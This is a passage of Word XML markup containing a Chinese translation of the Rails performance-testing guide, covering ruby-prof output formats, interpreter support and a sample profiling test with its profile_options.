          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6131A3AE" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="176FC0A2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BrowsingTest#test_homepage (58 ms warmup)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="353DB60F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        process_time: 63 ms</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B7E2190" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>              memory: 832.13 KB</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50DA490F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>             objects: 7,882</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4861453E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>1.5.2.2 Flat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AA3F1A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Flat output 下会显示运行时间，内存等等 ———— 会对每一个方法进行计算。"看看 Ruby-Prof 的文档会许对你会有帮助":http://ruby-prof.rubyforge.org/files/examples /flat_txt.html.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C43B1A5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.2.3 </w:t>
      </w:r>
      <w:r>
        <w:t>图形</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C02E1AE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>图形输出会显示每个方法所运行的时间，调用的对象，被哪个对象所调用。"参考 Ruby-Prof ":http://ruby-prof.rubyforge.org/files/examples/graph_txt.html.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0598A8C8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.2.4 </w:t>
      </w:r>
      <w:r>
        <w:t>树形</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8FA898" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">将分析测试的结果显示成树形结构，用到了 </w:t>
      </w:r>
      <w:hyperlink r:id="rId825" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>kcachegrind</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 和其他的一些工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E43A1F1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.2.5 </w:t>
      </w:r>
      <w:r>
        <w:t>解释器支持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1"/>
        <w:gridCol w:w="385"/>
        <w:gridCol w:w="598"/>
        <w:gridCol w:w="466"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="0B65A7C8" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43A86268" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>解释器</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DD4110A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Flat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B9E7DA2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Graph</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A4670E4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Tree</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="2DB6D768" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55E26C09" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>MRI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A5780F0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39FA7811" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58DCE7D6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="3FE3C8CA" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A728260" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>REE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="760095A8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F7A46BE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="60F8B279" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="4012502C" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="209AB863" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Rubinius </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AA080FC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A812747" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37CC9F91" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="6F2E4D73" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="199A814D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">JRuby </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="575F2E3A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="797D5D4E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59716B4D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E5E24DE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.6 测试选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB94EA9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">性能测试留出了一些选项接口，你可以通过改变你的测试类中的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>profile_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 类变量来对测试进行设置。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="19AC5303" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C0B8674" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="713200E8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/performance_test_help'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2659AC49" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5933247D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Profiling results for each test method are written to tmp/performance.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A0BC38D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BrowsingTest &lt; ActionDispatch::PerformanceTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5059C087" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  self.profile_options = { :runs</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 5,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E3BDFC0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                           :metrics</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:wall_time, :memory] }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A038105" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73798676" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_homepage</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18286191" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get '/'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6033C586" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D2D9B51" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="02F952BD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在这个例子里，测试会运行 5 次来计算 wall_time 和 memory。这里是一些设置选项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3600"/>
        <w:gridCol w:w="2513"/>
        <w:gridCol w:w="786"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="7EAE4538" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31E7DC6D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Option </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27000B2E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47B9BC6D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Default</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B7E7DD6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
